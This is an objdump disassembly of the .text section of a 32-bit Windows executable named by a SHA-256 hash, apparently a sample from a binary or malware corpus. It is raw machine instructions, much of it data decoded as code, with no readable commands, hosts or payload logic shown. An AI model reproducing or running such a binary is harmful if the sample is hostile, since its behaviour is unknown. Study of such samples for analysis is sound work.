
bcb10ec73aa350e89765606744b9dc12d8c9341b392d19f6269600b78c67ecff.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    eax,0xbc004235
  401005:	xor    eax,0x35e40042
  40100a:	inc    edx
  40100b:	add    ah,ch
  40100d:	xor    eax,0x35f00042
  401012:	inc    edx
  401013:	add    ah,al
  401015:	xor    eax,0x35c80042
  40101a:	inc    edx
  40101b:	add    ah,cl
  40101d:	xor    eax,0x35d00042
  401022:	inc    edx
  401023:	add    ah,dl
  401025:	xor    eax,0x35d80042
  40102a:	inc    edx
  40102b:	add    ah,bl
  40102d:	xor    eax,0x33740042
  401032:	inc    edx
  401033:	add    BYTE PTR [eax+0x33],bh
  401036:	inc    edx
  401037:	add    BYTE PTR [ebx+esi*1+0x42],bh
  40103b:	add    BYTE PTR [eax-0x7bffbdcd],al
  401041:	xor    eax,DWORD PTR [edx+0x0]
  401044:	mov    BYTE PTR [ebx],dh
  401046:	inc    edx
  401047:	add    BYTE PTR [ebx+esi*1+0x33900042],cl
  40104e:	inc    edx
  40104f:	add    BYTE PTR [ebx+esi*1+0x33980042],dl
  401056:	inc    edx
  401057:	add    BYTE PTR [ebx+esi*1+0x33a00042],bl
  40105e:	inc    edx
  40105f:	add    BYTE PTR [ebx+esi*1+0x33a80042],ah
  401066:	inc    edx
  401067:	add    BYTE PTR [ebx+esi*1+0x33b00042],ch
  40106e:	inc    edx
  40106f:	add    BYTE PTR [ebx+esi*1+0x33b80042],dh
  401076:	inc    edx
  401077:	add    BYTE PTR [ebx+esi*1+0x33c00042],bh
  40107e:	inc    edx
  40107f:	add    ah,al
  401081:	xor    eax,DWORD PTR [edx+0x0]
  401084:	enter  0x4233,0x0
  401088:	int3   
  401089:	xor    eax,DWORD PTR [edx+0x0]
  40108c:	shl    BYTE PTR [ebx],1
  40108e:	inc    edx
  40108f:	add    ah,dl
  401091:	xor    eax,DWORD PTR [edx+0x0]
  401094:	fdiv   DWORD PTR [ebx]
  401096:	inc    edx
  401097:	add    ah,bl
  401099:	xor    eax,DWORD PTR [edx+0x0]
  40109c:	loopne 0x4010d1
  40109e:	inc    edx
  40109f:	add    ah,ah
  4010a1:	xor    eax,DWORD PTR [edx+0x0]
  4010a4:	call   0xec4052dc
  4010a9:	xor    eax,DWORD PTR [edx+0x0]
  4010ac:	lock xor eax,DWORD PTR [edx+0x0]
  4010b0:	hlt    
  4010b1:	xor    eax,DWORD PTR [edx+0x0]
  4010b4:	clc    
  4010b5:	xor    eax,DWORD PTR [edx+0x0]
  4010b8:	cld    
  4010b9:	xor    eax,DWORD PTR [edx+0x0]
  4010bc:	add    BYTE PTR [edx+eax*2],dh
  4010bf:	add    BYTE PTR [esp+esi*1],al
  4010c2:	inc    edx
  4010c3:	add    BYTE PTR [eax],cl
  4010c5:	xor    al,0x42
  4010c7:	add    BYTE PTR [esp+esi*1],cl
  4010ca:	inc    edx
  4010cb:	add    BYTE PTR [eax],dl
  4010cd:	xor    al,0x42
  4010cf:	add    BYTE PTR [esp+esi*1],dl
  4010d2:	inc    edx
  4010d3:	add    BYTE PTR [eax],bl
  4010d5:	xor    al,0x42
  4010d7:	add    BYTE PTR [esp+esi*1],bl
  4010da:	inc    edx
  4010db:	add    BYTE PTR [eax],ah
  4010dd:	xor    al,0x42
  4010df:	add    BYTE PTR [esp+esi*1],ah
  4010e2:	inc    edx
  4010e3:	add    BYTE PTR [eax],ch
  4010e5:	xor    al,0x42
  4010e7:	add    BYTE PTR [esp+esi*1],ch
  4010ea:	inc    edx
  4010eb:	add    BYTE PTR [eax],dh
  4010ed:	xor    al,0x42
  4010ef:	add    BYTE PTR [esp+esi*1],dh
  4010f2:	inc    edx
  4010f3:	add    BYTE PTR [eax],bh
  4010f5:	xor    al,0x42
  4010f7:	add    BYTE PTR [esp+esi*1],bh
  4010fa:	inc    edx
  4010fb:	add    BYTE PTR [eax+0x34],al
  4010fe:	inc    edx
  4010ff:	add    BYTE PTR [esp+esi*1+0x42],al
  401103:	add    BYTE PTR [eax+0x34],cl
  401106:	inc    edx
  401107:	add    BYTE PTR [esp+esi*1+0x42],cl
  40110b:	add    BYTE PTR [ebp+esi*1+0x35a00042],bl
  401112:	inc    edx
  401113:	add    BYTE PTR [ebp+esi*1+0x35a80042],ah
  40111a:	inc    edx
  40111b:	add    BYTE PTR [ebp+esi*1+0x35b00042],ch
  401122:	inc    edx
  401123:	add    BYTE PTR [eax+0x34],ah
  401126:	inc    edx
  401127:	add    BYTE PTR [esp+esi*1+0x42],ah
  40112b:	add    BYTE PTR [eax+0x34],ch
  40112e:	inc    edx
  40112f:	add    BYTE PTR [esp+esi*1+0x42],ch
  401133:	add    BYTE PTR [eax+0x34],dh
  401136:	inc    edx
  401137:	add    BYTE PTR [esp+esi*1+0x42],dh
  40113b:	add    BYTE PTR [eax+0x34],bh
  40113e:	inc    edx
  40113f:	add    BYTE PTR [esp+esi*1+0x42],bh
  401143:	add    BYTE PTR [eax-0x7bffbdcc],al
  401149:	xor    al,0x42
  40114b:	add    BYTE PTR [eax-0x73ffbdcc],cl
  401151:	xor    al,0x42
  401153:	add    BYTE PTR [eax-0x6bffbdcc],dl
  401159:	xor    al,0x42
  40115b:	add    BYTE PTR [eax-0x63ffbdcc],bl
  401161:	xor    al,0x42
  401163:	add    BYTE PTR [eax-0x5bffbdcc],ah
  401169:	xor    al,0x42
  40116b:	add    BYTE PTR [eax-0x53ffbdcc],ch
  401171:	xor    al,0x42
  401173:	add    BYTE PTR [eax-0x4bffbdcc],dh
  401179:	xor    al,0x42
  40117b:	add    BYTE PTR [eax-0x43ffbdcc],bh
  401181:	xor    al,0x42
  401183:	add    al,al
  401185:	xor    al,0x42
  401187:	add    ah,al
  401189:	xor    al,0x42
  40118b:	add    al,cl
  40118d:	xor    al,0x42
  40118f:	add    ah,cl
  401191:	xor    al,0x42
  401193:	add    al,dl
  401195:	xor    al,0x42
  401197:	add    ah,dl
  401199:	xor    al,0x42
  40119b:	add    al,bl
  40119d:	xor    al,0x42
  40119f:	add    ah,bl
  4011a1:	xor    al,0x42
  4011a3:	add    al,ah
  4011a5:	xor    al,0x42
  4011a7:	add    ah,ah
  4011a9:	xor    al,0x42
  4011ab:	add    al,ch
  4011ad:	xor    al,0x42
  4011af:	add    ah,ch
  4011b1:	xor    al,0x42
  4011b3:	add    al,dh
  4011b5:	xor    al,0x42
  4011b7:	add    ah,dh
  4011b9:	xor    al,0x42
  4011bb:	add    al,bh
  4011bd:	xor    al,0x42
  4011bf:	add    ah,bh
  4011c1:	xor    al,0x42
  4011c3:	add    BYTE PTR [eax],al
  4011c5:	xor    eax,0x35040042
  4011ca:	inc    edx
  4011cb:	add    BYTE PTR [eax],cl
  4011cd:	xor    eax,0x350c0042
  4011d2:	inc    edx
  4011d3:	add    BYTE PTR [eax],dl
  4011d5:	xor    eax,0x35140042
  4011da:	inc    edx
  4011db:	add    BYTE PTR [eax],bl
  4011dd:	xor    eax,0x351c0042
  4011e2:	inc    edx
  4011e3:	add    BYTE PTR [eax],ah
  4011e5:	xor    eax,0x35240042
  4011ea:	inc    edx
  4011eb:	add    BYTE PTR [eax],ch
  4011ed:	xor    eax,0x352c0042
  4011f2:	inc    edx
  4011f3:	add    BYTE PTR [eax],dh
  4011f5:	xor    eax,0x35340042
  4011fa:	inc    edx
  4011fb:	add    BYTE PTR [eax],bh
  4011fd:	xor    eax,0x353c0042
  401202:	inc    edx
  401203:	add    BYTE PTR [eax+0x35],al
  401206:	inc    edx
  401207:	add    BYTE PTR [ebp+esi*1+0x42],al
  40120b:	add    BYTE PTR [eax+0x35],cl
  40120e:	inc    edx
  40120f:	add    BYTE PTR [ebp+esi*1+0x42],cl
  401213:	add    BYTE PTR [eax+0x35],dl
  401216:	inc    edx
  401217:	add    BYTE PTR [ebp+esi*1+0x42],dl
  40121b:	add    BYTE PTR [eax+0x35],bl
  40121e:	inc    edx
  40121f:	add    BYTE PTR [ebp+esi*1+0x42],bl
  401223:	add    BYTE PTR [eax+0x35],ah
  401226:	inc    edx
  401227:	add    BYTE PTR [ebp+esi*1+0x42],ah
  40122b:	add    BYTE PTR [eax+0x35],ch
  40122e:	inc    edx
  40122f:	add    BYTE PTR [ebp+esi*1+0x42],ch
  401233:	add    BYTE PTR [eax+0x35],dh
  401236:	inc    edx
  401237:	add    BYTE PTR [ebp+esi*1+0x42],dh
  40123b:	add    BYTE PTR [eax+0x35],bh
  40123e:	inc    edx
  40123f:	add    BYTE PTR [ebp+esi*1+0x42],bh
  401243:	add    BYTE PTR [eax-0x7bffbdcb],al
  401249:	xor    eax,0x35880042
  40124e:	inc    edx
  40124f:	add    BYTE PTR [ebp+esi*1+0x35900042],cl
  401256:	inc    edx
  401257:	add    BYTE PTR [ebp+esi*1+0x2000042],dl
  40125e:	add    BYTE PTR [eax],al
  401260:	mov    WORD PTR [eax+ecx*1+0x8948400],ss
  401267:	add    BYTE PTR [eax],dl
  401269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40126a:	cwde   
  40126b:	xor    al,BYTE PTR [eax]
  40126d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40126e:	nop
  40126f:	xor    dh,al
  401271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401272:	test   al,0x32
  401274:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401276:	mov    al,ds:0x9f48c32
  40127b:	add    BYTE PTR [eax-0x6c],ch
  40127e:	or     BYTE PTR [eax],al
  401280:	lahf   
  401281:	test   eax,0xa90c3d73
  401286:	cmp    BYTE PTR ds:0x3d90a913,0xfa
  40128d:	test   al,0xcb
  40128f:	cmp    eax,0x3dd0a942
  401294:	add    BYTE PTR [ecx-0x5538c1eb],ch
  40129a:	dec    ecx
  40129b:	ds inc ebp
  40129d:	stos   BYTE PTR es:[edi],al
  40129e:	lds    edi,FWORD PTR [esi]
  4012a0:	fsubr  DWORD PTR [edx-0x1b73fff8]
  4012a6:	or     DWORD PTR [eax],eax
  4012a8:	sbb    BYTE PTR [eax+ecx*1-0x4a5bdd00],dl
  4012af:	xor    cl,cl
  4012b1:	mov    ds:0xa3c930fc,eax
  4012b6:	pop    ds
  4012b7:	xor    DWORD PTR [ebp+0x231ffa4],edi
  4012bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012be:	mov    bl,0x32
  4012c0:	shl    DWORD PTR [ebp+0x32de],0x0
	...
  4012d7:	add    BYTE PTR [ebp+eiz*4-0x5887cd0b],ch
  4012de:	adc    dh,BYTE PTR [ebx]
  4012e0:	pop    esi
  4012e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012e2:	pop    ebp
  4012e3:	xor    ecx,DWORD PTR ds:0x1b3381a7
  4012e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ea:	sahf   
  4012eb:	xor    esi,DWORD PTR [eax]
  4012ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ee:	mov    ebp,0xcba63733
  4012f3:	xor    eax,DWORD PTR [esi-0x5a]
  4012f6:	fnstenv [ebx]
  4012f8:	dec    ebx
  4012f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012fa:	out    0x33,eax
  4012fc:	pop    ecx
  4012fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012fe:	sysenter 
  401300:	jge    0x4012a2
  401302:	adc    esi,DWORD PTR [eiz*4-0x32cbc460]
  401309:	mov    al,ds:0xa0c23470
  40130e:	mov    WORD PTR [ecx+eiz*1],?
  401311:	mov    eax,ds:0xa0fe3492
  401316:	out    0x34,al
  401318:	and    al,0xa1
  40131a:	or     eax,0x139f7d35
  40131f:	xor    eax,0x35269f70
  401324:	push   ebp
  401325:	lahf   
  401326:	ss xor eax,0x35459f50
  40132c:	arpl   WORD PTR [edi-0x6099ca94],bx
  401332:	addr16 xor eax,0x35719f79
  401338:	push   0xffffff9f
  40133a:	mov    WORD PTR ds:0x0,?
	...
  401350:	(bad)  
  401351:	lahf   
  401352:	nop
  401353:	xor    eax,0x35aa9ff9
  401358:	adc    esp,DWORD PTR [eax-0x603dca3e]
  40135e:	hlt    
  40135f:	xor    eax,0x3604a28e
  401364:	and    BYTE PTR [edx-0x5ddbc9ad],0x74
  40136b:	adc    ah,BYTE PTR ss:[ebx-0x5cfac965]
  401372:	test   eax,0xbca2e536
  401377:	les    esp,FWORD PTR ss:[edx-0x5d9ac927]
  40137e:	loopne 0x4013b6
  401380:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401387:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40138e:	or     BYTE PTR [eax],al
  401390:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401397:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40139e:	or     BYTE PTR [eax],al
  4013a0:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013a7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013ae:	or     BYTE PTR [eax],al
  4013b0:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  4013c7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013ce:	or     BYTE PTR [eax],al
  4013d0:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013d7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013de:	or     BYTE PTR [eax],al
  4013e0:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013e7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013ee:	or     BYTE PTR [eax],al
  4013f0:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  4013f7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4013fe:	or     BYTE PTR [eax],al
  401400:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401407:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40140e:	or     BYTE PTR [eax],al
  401410:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401417:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40141e:	or     BYTE PTR [eax],al
  401420:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401427:	add    BYTE PTR [esp+edx*4+0x8],cl
	...
  40143e:	add    BYTE PTR [eax],al
  401440:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401447:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40144e:	or     BYTE PTR [eax],al
  401450:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401457:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40145e:	or     BYTE PTR [eax],al
  401460:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401467:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40146e:	or     BYTE PTR [eax],al
  401470:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401477:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40147e:	or     BYTE PTR [eax],al
  401480:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401487:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40148e:	or     BYTE PTR [eax],al
  401490:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  401497:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  40149e:	or     BYTE PTR [eax],al
  4014a0:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  4014b7:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  4014be:	or     BYTE PTR [eax],al
  4014c0:	mov    WORD PTR [eax+ecx*1+0x1760000],ss
  4014c7:	add    BYTE PTR [esp+ebp*8-0xe2cffb7],cl
  4014ce:	jl     0x401520
  4014d0:	fdivp  st(3),st
  4014d2:	imul   eax,DWORD PTR [ecx-0x10],0xfffffff0
  4014d6:	jp     0x40153d
  4014d8:	(bad)  
  4014da:	or     BYTE PTR [eax],al
  4014dc:	fdivr  st,st(3)
  4014de:	imul   esp,DWORD PTR [eax+edx*8-0x3],0xe6ad726a
  4014e6:	jno    0x40152d
  4014e8:	mov    ah,0xd5
  4014ea:	or     BYTE PTR [eax],al
  4014ec:	fdivr  st,st(3)
  4014ee:	imul   esp,DWORD PTR [eax+edx*8-0x3],0xe6ad726a
  4014f6:	jno    0x40153d
  4014f8:	xchg   esp,eax
  4014f9:	ret    
  4014fa:	or     BYTE PTR [eax],al
  4014fc:	push   ebx
  4014fd:	icebp  
  4014fe:	jl     0x40154d
  401500:	jae    0x4014f2
  401502:	jge    0x401570
  401504:	jno    0x4014e2
  401506:	imul   ebp,DWORD PTR [esi+0x68],0x8c416df8
  40150d:	xchg   esp,eax
  40150e:	or     BYTE PTR [eax],al
  401510:	dec    edi
  401511:	out    0x6d,al
  401513:	popa   
  401514:	pusha  
  401515:	icebp  
  401516:	dec    esi
  401517:	imul   esp,DWORD PTR [eax-0xf],0xe7380049
  40151e:	jl     0x401592
  401520:	das    
  401521:	cmc    
  401522:	jl     0x401565
  401524:	mov    WORD PTR [eax+ecx*1+0x7cf14b00],ss
  40152b:	push   edi
	...
  401540:	xor    eax,0x1b6f6cfa
  401545:	out    0x4c,eax
  401547:	imul   ebx,DWORD PTR [esi],0x23746bf1
  40154d:	out    0x71,al
  40154f:	inc    ecx
  401550:	mov    WORD PTR [eax+ecx*1+0x7cefcb00],ss
  401557:	dec    ebp
  401558:	jmp    0x40154a
  40155a:	jge    0x4015c8
  40155c:	jmp    0xf0ae7f3d
  401561:	clc    
  401562:	ins    DWORD PTR es:[edi],dx
  401563:	push   edi
  401564:	mov    WORD PTR [eax+ecx*1+0x48969000],ss
  40156b:	add    BYTE PTR [eax-0x6a],bh
  40156e:	dec    eax
  40156f:	add    BYTE PTR [eax-0x6a],dh
  401572:	dec    eax
  401573:	add    BYTE PTR [eax-0x6a],bh
  401576:	dec    eax
  401577:	add    ah,al
  401579:	xchg   esi,eax
  40157a:	dec    eax
  40157b:	add    al,bl
  40157d:	xchg   esi,eax
  40157e:	dec    eax
  40157f:	add    BYTE PTR [esi+edx*4-0x695bffb8],ch
  401586:	dec    eax
  401587:	add    bl,dl
  401589:	out    dx,eax
  40158a:	jl     0x4015dc
  40158c:	sahf   
  40158d:	stc    
  40158e:	imul   eax,DWORD PTR [ecx+0x70],0xfffffff0
  401592:	jp     0x4015f9
  401594:	jg     0x40157b
  401596:	or     BYTE PTR [eax],al
  401598:	dec    eax
  401599:	stc    
  40159a:	imul   esp,DWORD PTR [eax+eax*2-0x5],0xe66d726a
  4015a2:	jno    0x4015e9
	...
  4015b8:	ror    DWORD PTR fs:[eax],cl
  4015bb:	add    BYTE PTR [edi-0x11],ah
  4015be:	jp     0x40162e
  4015c0:	imul   edi,eax,0xf07a323b
  4015c6:	fs ins BYTE PTR es:[edi],dx
  4015c8:	mov    WORD PTR [eax+ecx*1+0x7ee52900],ss
  4015cf:	arpl   WORD PTR [esi],di
  4015d1:	loopne 0x4015f9
  4015d3:	fs cmp al,bh
  4015d6:	or     BYTE PTR [eax],al
  4015d8:	xor    edi,ebp
  4015da:	gs jae 0x40160e
  4015dd:	loopne 0x4015e7
  4015df:	add    BYTE PTR [ecx],ah
  4015e1:	in     eax,0x7e
  4015e3:	arpl   si,di
  4015e5:	loopne 0x40160d
  4015e7:	fs lock clc 
  4015ea:	or     BYTE PTR [eax],al
  4015ec:	jmp    0xfca37be0
  4015f1:	jmp    0x4015fb
  4015f3:	add    dl,al
  4015f5:	sti    
  4015f6:	jp     0x40166c
  4015f8:	fpatan 
  4015fa:	fs inc ecx
  4015fc:	call   0x8ca37df9
  401601:	xchg   esp,eax
  401602:	or     BYTE PTR [eax],al
  401604:	loope  0x401600
  401606:	gs popa 
  401608:	mov    esp,0xc36561c2
  40160d:	fldcw  WORD PTR [esi+0x46]
  401610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401611:	clc    
  401612:	ins    DWORD PTR es:[edi],dx
  401613:	add    dl,al
  401615:	sti    
  401616:	jp     0x40168c
  401618:	cdq    
  401619:	repz fs push eax
	...
  401630:	sahf   
  401631:	stc    
  401632:	jl     0x401699
  401634:	scas   eax,DWORD PTR es:[edi]
  401635:	loopne 0x40163f
  401637:	add    BYTE PTR [edi+ebp*8+0x69],dl
  40163b:	jo     0x40168a
  40163d:	clc    
  40163e:	outs   dx,DWORD PTR fs:[esi]
  401640:	outs   dx,DWORD PTR ds:[esi]
  401641:	xchg   esp,eax
  401642:	or     BYTE PTR [eax],al
  401644:	addr16 out dx,eax
  401646:	jp     0x4016b6
  401648:	jno    0x401642
  40164a:	cmp    esi,DWORD PTR [edx]
  40164c:	mov    dl,0xf0
  40164e:	fs ins BYTE PTR es:[edi],dx
  401650:	mov    WORD PTR [eax+ecx*1+0x7cef4b00],ss
  401657:	push   eax
  401658:	ds stc 
  40165a:	imul   esp,DWORD PTR [ebp+0x3f],0xffffffe5
  40165e:	inc    eax
  40165f:	gs sub eax,0x8c0008e4
  401665:	xchg   esp,eax
  401666:	outs   dx,BYTE PTR ds:[esi]
  401667:	add    DWORD PTR [eax+esi*1+0x7e8c9051],ecx
  40166e:	or     eax,DWORD PTR [eax]
  401670:	mov    WORD PTR [edi+0xb],?
  401673:	add    BYTE PTR [edx+ebp*2-0x5a73ff0d],cl
  40167a:	or     eax,DWORD PTR [eax]
  40167c:	mov    WORD PTR [ebp+0xb],?
  40167f:	add    BYTE PTR [ebp+edi*4+0x7d8c000c],cl
  401686:	or     eax,DWORD PTR [eax]
  401688:	mov    WORD PTR [ebp+0xb],?
  40168b:	add    BYTE PTR [ebp+edi*2+0x7d8c000b],cl
  401692:	or     eax,DWORD PTR [eax]
	...
  4016a8:	mov    WORD PTR [ebp+0xb],?
  4016ab:	add    BYTE PTR [ebp+edi*2+0x7d8c000b],cl
  4016b2:	or     eax,DWORD PTR [eax]
  4016b4:	mov    WORD PTR [ebp+0xb],?
  4016b7:	add    BYTE PTR [ebp+edi*8+0x6f8c000c],cl
  4016be:	adc    bh,BYTE PTR [edx+0x9a77d92]
  4016c4:	dec    ecx
  4016c5:	pop    ebp
  4016c6:	mov    bl,0x1
  4016c8:	sar    BYTE PTR [eax],0x2d
  4016cb:	push   esp
  4016cc:	je     0x401662
  4016ce:	jg     0x4016f0
  4016d0:	jl     0x40173d
  4016d2:	bound  esp,QWORD PTR [edi+0x7e]
  4016d5:	pop    esp
  4016d6:	pusha  
  4016d7:	and    BYTE PTR [edi+0x5c],ch
  4016da:	popa   
  4016db:	outs   dx,BYTE PTR ds:[esi]
  4016dc:	jnp    0x401727
  4016de:	sub    esp,DWORD PTR [edx+0x69]
  4016e1:	popf   
  4016e2:	jle    0x401759
  4016e4:	push   0xffffff9d
  4016e6:	outs   dx,BYTE PTR gs:[esi]
  4016e8:	lods   al,BYTE PTR ds:[esi]
  4016e9:	xor    DWORD PTR [edx+0x53],eax
  4016ec:	ins    BYTE PTR es:[edi],dx
  4016ed:	push   eax
  4016ee:	bound  esp,QWORD PTR [ecx+ebp*1+0x67]
  4016f2:	add    BYTE PTR ds:0x3c59486,cl
  4016f8:	mov    WORD PTR [ecx+eiz*8-0x4e6b73fd],ss
  4016ff:	inc    eax
  401700:	mov    WORD PTR [ebp+edx*4+0x37948f04],ss
  401707:	fcomi  st,st(7)
  401709:	(bad)
	...
  40171d:	add    BYTE PTR [eax],al
  40171f:	add    BYTE PTR [esp+edx*4-0x6b73fc1f],cl
  401726:	add    DWORD PTR [ebx+ecx*4],eax
  401729:	xchg   ebp,eax
  40172a:	cli    
  40172b:	add    al,0x8e
  40172d:	mov    ds:0x948d1be1,al
  401732:	loope  0x401789
  401734:	mov    WORD PTR [ecx+eiz*8+0x18948c03],ss
  40173b:	pop    es
  40173c:	lea    edx,[ecx+eiz*8-0x1e6b73ed]
  401743:	xor    ecx,DWORD PTR [ebp-0x33fc1e6c]
  401749:	xchg   esp,eax
  40174a:	loope  0x40175f
  40174c:	mov    WORD PTR [ecx+eiz*8-0x1a6b73fb],ss
  401753:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc1f]
  40175a:	in     eax,0x3
  40175c:	mov    WORD PTR [ecx+eiz*8-0x1e6b73fd],ss
  401763:	xchg   ebx,eax
  401764:	lea    edx,[ecx+eiz*8+0x30948c05]
  40176b:	lods   al,BYTE PTR ds:[esi]
  40176c:	lea    edx,[ebx+eiz*8-0x1e6b73fd]
  401773:	add    edi,DWORD PTR [esp+edx*4-0x1f]
  401777:	adc    ecx,DWORD PTR [esp+edx*4-0x6b83fc1f]
  40177e:	loope  0x401793
  401780:	mov    WORD PTR [eax+ecx*1+0xe9],ss
	...
  401797:	add    BYTE PTR [edi-0x7026f76c],cl
  40179d:	xchg   esp,eax
  40179e:	or     cl,ch
  4017a0:	(bad)  
  4017a1:	xchg   esp,eax
  4017a2:	or     cl,ch
  4017a4:	(bad)  
  4017a5:	xchg   esp,eax
  4017a6:	or     BYTE PTR ds:0x21089525,dl
  4017ac:	(bad)  
  4017ad:	xchg   esp,eax
  4017ae:	or     cl,ch
  4017b0:	(bad)  
  4017b1:	xchg   esp,eax
  4017b2:	or     cl,ch
  4017b4:	(bad)  
  4017b5:	xchg   esp,eax
  4017b6:	or     cl,ch
  4017b8:	(bad)  
  4017b9:	xchg   esp,eax
  4017ba:	or     cl,ch
  4017bc:	(bad)  
  4017bd:	xchg   esp,eax
  4017be:	or     cl,ch
  4017c0:	(bad)  
  4017c1:	xchg   esp,eax
  4017c2:	or     cl,ch
  4017c4:	(bad)  
  4017c5:	xchg   esp,eax
  4017c6:	or     cl,ch
  4017c8:	(bad)  
  4017c9:	xchg   esp,eax
  4017ca:	or     cl,ch
  4017cc:	(bad)  
  4017cd:	xchg   esp,eax
  4017ce:	or     cl,ch
  4017d0:	(bad)  
  4017d1:	xchg   esp,eax
  4017d2:	or     cl,ch
  4017d4:	(bad)  
  4017d5:	xchg   esp,eax
  4017d6:	or     cl,ch
  4017d8:	(bad)  
  4017d9:	xchg   esp,eax
  4017da:	or     cl,ch
  4017dc:	(bad)  
  4017dd:	xchg   esp,eax
  4017de:	or     cl,ch
  4017e0:	(bad)  
  4017e1:	xchg   esp,eax
  4017e2:	or     cl,ch
  4017e4:	(bad)  
  4017e5:	xchg   esp,eax
  4017e6:	or     cl,ch
  4017e8:	(bad)  
  4017e9:	xchg   esp,eax
  4017ea:	or     cl,ch
  4017ec:	(bad)  
  4017ed:	xchg   esp,eax
  4017ee:	or     cl,ch
  4017f0:	(bad)  
  4017f1:	xchg   esp,eax
  4017f2:	or     cl,ch
  4017f4:	(bad)  
  4017f5:	xchg   esp,eax
  4017f6:	or     cl,ch
  4017f8:	(bad)  
  4017f9:	xchg   esp,eax
  4017fa:	or     cl,ch
	...
  401810:	(bad)  
  401811:	xchg   esp,eax
  401812:	or     BYTE PTR [ebp+0x7908940e],bh
  401818:	(bad)  
  401819:	xchg   esp,eax
  40181a:	or     cl,ch
  40181c:	(bad)  
  40181d:	xchg   esp,eax
  40181e:	or     cl,ch
  401820:	(bad)  
  401821:	xchg   esp,eax
  401822:	or     BYTE PTR [eax],al
  401824:	in     eax,0x91
  401826:	or     BYTE PTR [eax],al
  401828:	mov    ch,0x91
  40182a:	or     BYTE PTR [eax],al
  40182c:	mov    ch,0x91
  40182e:	or     BYTE PTR [eax],al
  401830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401831:	xchg   ecx,eax
  401832:	or     BYTE PTR [eax],al
  401834:	fcomi  st,st(5)
  401836:	ins    DWORD PTR es:[edi],dx
  401837:	js     0x40183a
  401839:	xchg   edx,eax
  40183a:	or     BYTE PTR [eax],al
  40183c:	out    dx,al
  40183d:	test   BYTE PTR [ecx],cl
  40183f:	add    BYTE PTR [ebp-0x5afff77f],ah
  401845:	mov    DWORD PTR [ecx],ecx
  401847:	add    BYTE PTR [ebp-0x71],dh
  40184a:	or     BYTE PTR [eax],al
  40184c:	jne    0x4017df
  40184e:	or     BYTE PTR [eax],al
  401850:	gs xchg ecx,eax
  401852:	or     BYTE PTR [eax],al
  401854:	gs xchg ecx,eax
  401856:	or     BYTE PTR [eax],al
  401858:	xchg   ebp,eax
  401859:	nop
  40185a:	or     BYTE PTR [eax-0x75],ah
  40185d:	fisubr WORD PTR [ecx+eiz*2-0x3f]
  401861:	icebp  
  401862:	or     BYTE PTR [eax],al
  401864:	gs xchg edx,eax
  401866:	or     BYTE PTR [eax],al
  401868:	xor    eax,0x350009a1
  40186d:	(bad)
  401871:	xchg   DWORD PTR [ecx],ecx
	...
  401887:	add    BYTE PTR ds:0x35000891,ah
  40188d:	xchg   ecx,eax
  40188e:	or     BYTE PTR [eax],al
  401890:	xor    eax,0x65000891
  401895:	nop
  401896:	or     BYTE PTR [eax+0x3b],al
  401899:	lds    ebp,FWORD PTR [ecx+0x74]
  40189c:	xchg   esp,eax
  40189d:	nop
  40189e:	or     BYTE PTR [eax],al
  4018a0:	dec    ebp
  4018a1:	fisttp DWORD PTR [eax]
  4018a3:	add    ch,ah
  4018a5:	ror    BYTE PTR [ecx],1
  4018a7:	add    ch,ah
  4018a9:	(bad)  
  4018aa:	or     BYTE PTR [eax],al
  4018ac:	cmc    
  4018ad:	jl     0x4018b8
  4018af:	add    BYTE PTR [ebx+edi*2+0x7b8c000b],cl
  4018b6:	or     eax,DWORD PTR [eax]
  4018b8:	mov    WORD PTR [ebx+0xb],?
  4018bb:	add    BYTE PTR [ebx+edi*1+0x7acc000b],cl
  4018c2:	or     eax,DWORD PTR [eax]
  4018c4:	mov    WORD PTR [ebx+0xb],?
  4018c7:	add    BYTE PTR [ebx+edi*2+0x7b8c000b],cl
